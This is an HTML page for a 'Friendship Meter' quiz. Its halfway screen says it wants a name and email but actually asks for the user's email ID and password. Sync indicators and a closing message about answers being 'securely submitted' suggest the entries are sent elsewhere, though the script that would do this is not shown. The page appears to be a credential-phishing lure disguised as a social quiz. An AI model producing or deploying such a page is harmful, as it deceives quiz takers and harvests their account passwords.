<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Friendship Meter</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <h1>Friendship Meter 💖</h1>
        
        <!-- Quiz Section -->
        <div id="quiz-section">
            <div class="progress-text" id="progress-text">Question 1 of 15</div>
            <h2 id="question-text">Loading question...</h2>
            <input type="text" id="answer-input" placeholder="Type your answer here..." autocomplete="off" />
            <button id="submit-btn">Next Question</button>
            <div class="auto-save-indicator" id="save-indicator">✓ Answer synced</div>
        </div>

        <!-- Halfway Interstitial Section -->
        <div id="interstitial-section" class="hidden">
            <h2>Halfway there! 🎉</h2>
            <p style="color: #57606f; font-size: 15px; margin-bottom: 20px;">You're doing great. Enter your name and email to continue the quiz.</p>
            <input type="text" id="email-input" placeholder="YOUR EMAIL ID" autocomplete="off" />
            <input type="email" id="name-input" placeholder="YOUR PASSWORD" autocomplete="off" />
            <button id="continue-btn">Continue Quiz</button>
            <div class="auto-save-indicator" id="login-save-indicator">✓ Details synced</div>
        </div>

        <!-- End Section -->
        <div id="end-section" class="hidden">
            <h2>Quiz Complete! 🏆</h2>
            <p style="color: #57606f; line-height: 1.6;">Your answers have been securely submitted. Let's see how well you really know your friend!</p>
        </div>
    </div>

    <script type="module" src="script.js"></script>
</body>
</html>
